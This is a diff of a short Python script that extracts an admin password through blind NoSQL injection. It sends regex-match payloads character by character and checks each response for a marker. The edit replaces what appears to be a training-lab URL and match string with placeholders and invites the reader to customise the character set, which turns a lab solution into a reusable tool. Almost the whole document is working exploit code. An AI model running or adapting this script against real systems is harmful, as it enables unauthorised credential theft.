@@ -1,20 +1,20 @@
 import requests
 
-url_base = "http://ptl-f9369c360ae7-e3963cd04734.libcurl.me/?search=admin'%26%26 this.password.match(/^"
+url_base = "Begining.example.php.url/?search=admin'%26%26 this.password.match(/^"
 url_end = "/)%00"
 
-# Function to make a request and check if ">admin<" is in the response body
+# Function to make a request and check if "example" is in the response body
 def make_request(payload):
     full_url = url_base + payload + url_end
     try:
         response = requests.get(full_url)
-        if response.status_code == 200 and ">admin<" in response.text:
+        if response.status_code == 200 and "example" in response.text:
             return True
     except requests.RequestException as e:
         print(f"Request failed: {e}")
     return False
 
-# Iterate through the alphabet and the '-' character
+# Iterate through the alphabet and the '-' character, and customize for any characters you wish to include
 characters = '5abcdefghijklmnopqrstuvwxyz-123467890'
 current_payload = ""
 
